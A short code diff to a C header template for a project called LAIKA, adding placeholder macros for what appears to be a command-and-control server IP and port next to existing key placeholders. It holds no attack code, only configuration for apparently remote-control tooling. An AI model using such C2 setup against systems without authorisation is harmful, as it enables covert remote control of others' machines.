@@ -8,5 +8,7 @@
 /* keys */
 #define LAIKA_PUBKEY "@LAIKA_PUBKEY@"
 #define LAIKA_PRIVKEY "@LAIKA_PRIVKEY@"
+#define LAIKA_CNC_IP "@LAIKA_CNC_IP@"
+#define LAIKA_CNC_PORT "@LAIKA_CNC_PORT@"
 
 #endif
